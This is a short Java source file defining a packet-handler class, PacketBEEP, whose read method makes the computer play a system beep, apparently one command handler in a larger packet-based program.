package com.redpois0n.packets;

import java.awt.Toolkit;

public class PacketBEEP extends AbstractPacket {

	@Override
	public void read(String line) throws Exception {
		Toolkit.getDefaultToolkit().beep();
	}

}
